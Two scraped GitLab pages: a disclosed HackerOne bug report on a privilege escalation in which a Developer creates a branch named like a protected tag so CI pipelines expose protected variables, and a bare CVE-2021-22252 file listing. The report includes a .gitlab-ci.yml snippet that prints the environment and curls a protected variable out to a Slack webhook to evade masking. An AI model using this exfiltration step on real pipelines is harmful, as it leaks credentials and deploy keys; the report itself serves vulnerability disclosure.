=== Content from gitlab.com_27c6a3d5_20250114_234252.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Privilege Escalation - Project members can access any protected environment variable without authorization

**[HackerOne report #1186135](https://hackerone.com/reports/1186135)** by `rodrigopetter` on 2021-05-06, assigned to [@dcouture](/dcouture "Dominic Couture"):

[Report](#report) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

Any user (including External Users) that can create branches is able to access protected environment variables (database passwords, private keys, etc.) through pipeline execution, if there is any protected tag created.

##### Steps to reproduce

1. Create a new repository with the following configs
   1. Protect all tags (\*) Allowed to create: Maintainers
   2. Create some protected environment variables (Settings> CI / CD> Variables):
      1. PROJECT\_DEPLOY\_SERVER\_PRIVATE\_KEY
      2. PROTECTED\_PROJECT\_VARIABLE
2. Create a new tag named "v1.0.0"
3. Give access to the project to a new member with the "Developer" role
4. The "Developer" accont can't access any environment variables neither create protected tags or push/merge in to protected branches
5. But the "Developer" account can create a new branch with the same name as any protected tag
6. **Any pipeline executed for changes in this new branch will be executed as if it was a protected tag**
7. The developer can change the file `.gitlab-ci.yml` at will, scanning any protected environment variable and sending them externally to bypass any masks

```
job:
  script:
    - printenv
    - curl -k -X POST -H 'Content-type: application / json' --data "{\" text \ ": \" $ PROTECTED_PROJECT_VARIABLE \ "}" https://hooks.slack.com/services/XXXXXXXXXXX
```

##### What is the current *bug* behavior?

The Developer can access information outside his permission, as stated in [Project members permissions table](https://docs.gitlab.com/ee/user/permissions.html#project-members-permissions). He can see Project Level CI/CD variables that are restricted to "Managers" and also can see group level CI/CD variables that are restricted to "Owners".

Here is an example pipeline: <https://gitlab.com/rpd_test_private_group/test_private_project/-/jobs/1241128584>

There is a related issue about the bug that creates this vulnerability: [#219583 (closed)](https://gitlab.com/gitlab-org/gitlab/-/issues/219583 "Branch and tag with same name cause multiple problems")

##### What is the expected *correct* behavior?

Pipelines executed for branches should not have the same privileges as a protected tag despite having the same name.

##### Output of checks

This bug happens on GitLab.com

#### Impact

Project members can have access to sensitive information without authorization.

It's common for teams to have production configurations stored as environment variables, including deploy information like private ssh keys.

The confidentiality of this information is lost and an attacker can have full controll of a production environment.

Edited Jul 14, 2021 by [Hordur Freyr Yngvason](/hfyngvason)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_58fa85e7_20250114_234250.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2021](/gitlab-org/cves/-/tree/master/2021)
* [**CVE-2021-22252.json**](/gitlab-org/cves/-/blob/master/2021/CVE-2021-22252.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2021/CVE-2021-22252.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2021/CVE-2021-22252.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ GitLab Bot 's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 " GitLab Bot ")](/gitlab-bot)

  Aug 23, 2021

  [4fa9ce12](/gitlab-org/cves/-/commit/4fa9ce12fe3e9b007c4a38b08d1a34fb8b2df040)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/4fa9ce12fe3e9b007c4a38b08d1a34fb8b2df040)
  繚
  4fa9ce12

  [ GitLab Bot ](/gitlab-bot) authored Aug 23, 2021

  4fa9ce12

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/4fa9ce12fe3e9b007c4a38b08d1a34fb8b2df040)
  [ GitLab Bot ](/gitlab-bot) authored Aug 23, 2021

Loading


